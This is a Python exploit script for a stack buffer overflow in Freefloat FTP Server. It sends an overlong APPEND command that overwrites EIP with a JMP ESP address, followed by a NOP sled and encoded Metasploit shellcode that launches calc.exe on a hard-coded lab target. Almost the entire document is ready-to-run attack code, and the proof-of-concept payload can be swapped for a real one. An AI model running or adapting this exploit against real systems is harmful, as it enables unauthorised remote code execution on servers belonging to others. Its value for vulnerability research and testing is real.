#!/usr/bin/python
import socket, sys, os, time
 
print "\n+---------------------------------------+"
print "+  Freefloat FTP Server Buffer Overflow +"
print "+       HackSys Team - Panthera         +"
print "+            Ashfaq Ansari              +"
print "+       hacksysteam@hotmail.com         +"
print "+      http://hacksys.vfreaks.com/      +"
print "+---------------------------------------+\n"

#Target IP address
target = "192.168.96.131"
#Target Port
port = 21

#Send 244 bytes of junk bytes
junk = "A" * 244

#EIP overwrite offset

eip = "\x53\x93\x42\x7E" #7E429353 JMP ESP USER32.dll # Little Endian

#Junk - NOP - No Operation Code
junk2 = "\x90" * 20

#msfpayload windows/exec CMD=calc.exe R | msfencode -a x86 -b "\x00\x0a\x0d" -t c > calc.shellcode
#[*] x86/shikata_ga_nai succeeded with size 228 (iteration=1)
#Size: 228 bytes
#Bad chars: \x00\x0a\x0d
esp_shellcode = ("\xd9\xc7\x2b\xc9\xd9\x74\x24\xf4\xb8\xef\x46\x88\xf0\x5d\xb1"
				 "\x33\x83\xc5\x04\x31\x45\x14\x03\x45\xfb\xa4\x7d\x0c\xeb\xa0"
				 "\x7e\xed\xeb\xd2\xf7\x08\xda\xc0\x6c\x58\x4e\xd5\xe7\x0c\x62"
				 "\x9e\xaa\xa4\xf1\xd2\x62\xca\xb2\x59\x55\xe5\x43\x6c\x59\xa9"
				 "\x87\xee\x25\xb0\xdb\xd0\x14\x7b\x2e\x10\x50\x66\xc0\x40\x09"
				 "\xec\x72\x75\x3e\xb0\x4e\x74\x90\xbe\xee\x0e\x95\x01\x9a\xa4"
				 "\x94\x51\x32\xb2\xdf\x49\x39\x9c\xff\x68\xee\xfe\x3c\x22\x9b"
				 "\x35\xb6\xb5\x4d\x04\x37\x84\xb1\xcb\x06\x28\x3c\x15\x4e\x8f"
				 "\xde\x60\xa4\xf3\x63\x73\x7f\x89\xbf\xf6\x62\x29\x34\xa0\x46"
				 "\xcb\x99\x37\x0c\xc7\x56\x33\x4a\xc4\x69\x90\xe0\xf0\xe2\x17"
				 "\x27\x71\xb0\x33\xe3\xd9\x63\x5d\xb2\x87\xc2\x62\xa4\x60\xbb"
				 "\xc6\xae\x83\xa8\x71\xed\xc9\x2f\xf3\x8b\xb7\x2f\x0b\x94\x97"
				 "\x47\x3a\x1f\x78\x10\xc3\xca\x3c\xee\x89\x57\x14\x66\x54\x02"
				 "\x24\xeb\x67\xf8\x6b\x15\xe4\x09\x14\xe2\xf4\x7b\x11\xaf\xb2"
				 "\x90\x6b\xa0\x56\x97\xd8\xc1\x72\xf4\xbf\x51\x1e\xd5\x5a\xd1"
				 "\x85\x29\xaf")

#Another Junk - NOP - No Operation Code
junk3 = "\x90" * 300

#Create socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

print "[+] Connecting to %s on port %d" % (target,port)
try:
	#Connect to target port
    s.connect((target,port))
	#Receive 1024 bytes
    s.recv(1024)
    print "[+] Triggering Vulnerability - Sending junk data"
	#Send vulnerable command
    s.send("APPEND " + junk + eip + junk2 + esp_shellcode + junk3 + "\r\n")
	#Close the socket
    s.close()
    print "[+] Exploit Sent Successfully. Check for calc.exe"

except:
    print "[-] Could not connect to %s on port %d" % (target,port)
	#Exit the exploit
    sys.exit(0)
    
